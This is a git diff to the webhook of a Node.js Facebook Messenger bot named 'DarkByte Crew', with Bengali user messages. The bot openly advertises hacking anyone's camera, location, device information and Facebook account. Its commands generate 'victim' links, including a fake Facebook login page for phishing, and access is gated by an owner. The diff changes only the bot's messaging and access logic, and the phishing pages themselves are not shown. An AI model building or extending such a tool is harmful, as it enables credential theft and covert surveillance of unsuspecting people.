@@ -20,7 +20,14 @@ async function runCommand(senderId, command, args) {
             await sendMessage(senderId, '❌ কমান্ড চালাতে সমস্যা হয়েছে।');
         }
     } else {
-        await sendMessage(senderId, '❓ এই কমান্ডটি নেই। `.camera`, `.location`, `.fb` বা `.uptime` লিখুন।');
+        // ভুল কমান্ড (অজানা কমান্ড)
+        await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:
+
+🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক
+🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক
+🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক
+
+🔗 Owner: m.me/2ndJohnnySins`);
     }
 }
 
@@ -54,39 +61,67 @@ router.post('/webhook', async (req, res) => {
             let user = await User.findOne({ fbId: senderId });
 
             if (!user) {
+                // ইউজারের প্রোফাইল থেকে ফুল নাম সংগ্রহ করি
                 const profile = await getUserProfile(senderId);
-                const firstName = profile?.first_name || 'বন্ধু';
+                const fullName = profile?.name || 'বন্ধু';
 
                 user = new User({
                     fbId: senderId,
-                    firstName: firstName,
+                    firstName: fullName,   // পুরো নাম সংরক্ষণ
                     allowed: false,
                     firstSeen: new Date()
                 });
                 await user.save();
 
-                const introMsg = `আসসালামু আলাইকুম ${firstName}, 👋\n\nআমি **DarkByte Crew** বট, আমি ভিক্টিম লিংক তৈরি ও ডেটা কালেক্ট করতে পারি।\n\nআপনি আমাকে ব্যবহার করতে চাইলে অ্যাডমিন এর থেকে অনুমতি নিন:\n🔗 https://facebook.com/2ndJohnnySins`;
-                
+                // নতুন ইউজারের জন্য ওয়েলকাম মেসেজ (আপনার দেওয়া ফরম্যাট)
+                const introMsg = `আসসালামু আলাইকুম, ${fullName}! 👋
+
+⚡ DarkByte Crew বটে আপনাকে স্বাগতম। 🥳
+আপনি এই বটের মাধ্যমে খুব সহজেই যে কারো ডিভাইসের ইনফোরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক আইডি হ্যাক করতে পারবেন।💯
+
+আমাদের কমান্ড গুলোঃ
+📷️ .camera - ক্যামেরা হ্যাকের লিঙ্ক তৈরি করুন
+🗾 .location - লোকেশন হ্যাকের লিঙ্ক তৈরি করুন
+🔥 .fb - ফেসবুক আইডি হ্যাকের লিঙ্ক তৈরি করুন
+
+Owner : m.me/2ndJohnnySins`;
+
                 await sendMessage(senderId, introMsg);
                 continue;
             }
 
+            // লাস্ট সিন আপডেট
             user.lastSeen = new Date();
             user.messageCount = (user.messageCount || 0) + 1;
             await user.save();
 
+            // অনুমতি চেক
             if (!user.allowed) {
-                await sendMessage(senderId, '⛔ আপনি আমাকে ব্যবহার করার অনুমতি পান নি।\nঅনুমতি নিতে: https://facebook.com/2ndJohnnySins');
+                // অনুমতি না থাকলে মেসেজ
+                const accessDeniedMsg = `⛔ Access Denied / অনুমতি নেই!
+
+এই বটটি ব্যবহার করতে চাইলে ওনারের সাথে যোগাযোগ করে অনুমতি নিন।
+
+🔗 Owner: m.me/2ndJohnnySins`;
+                await sendMessage(senderId, accessDeniedMsg);
                 continue;
             }
 
+            // কমান্ড প্রসেস
             if (text.startsWith('.')) {
                 const parts = text.slice(1).split(' ');
                 const command = parts[0].toLowerCase();
                 const args = parts.slice(1);
                 await runCommand(senderId, command, args);
             } else {
-                await sendMessage(senderId, '📌 সঠিক কমান্ড দিন:\n\n🔹 `.camera` - ক্যামেরা + ডিভাইস ইনফো লিংক\n🔹 `.location` - লোকেশন + ডিভাইস ইনফো লিংক\n🔹 `.fb` - ফেক ফেসবুক লগইন লিংক\n🔹 `.uptime` - বট আপটাইম দেখায়\n\nআরও জানতে: https://facebook.com/2ndJohnnySins');
+                // অনুমতি থাকলেও কমান্ড না দিলে নির্দেশনা (ভুল কমান্ডের মতো)
+                await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:
+
+🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক
+🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক
+🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক
+
+🔗 Owner: m.me/2ndJohnnySins`);
             }
         }
         res.status(200).send('EVENT_RECEIVED');
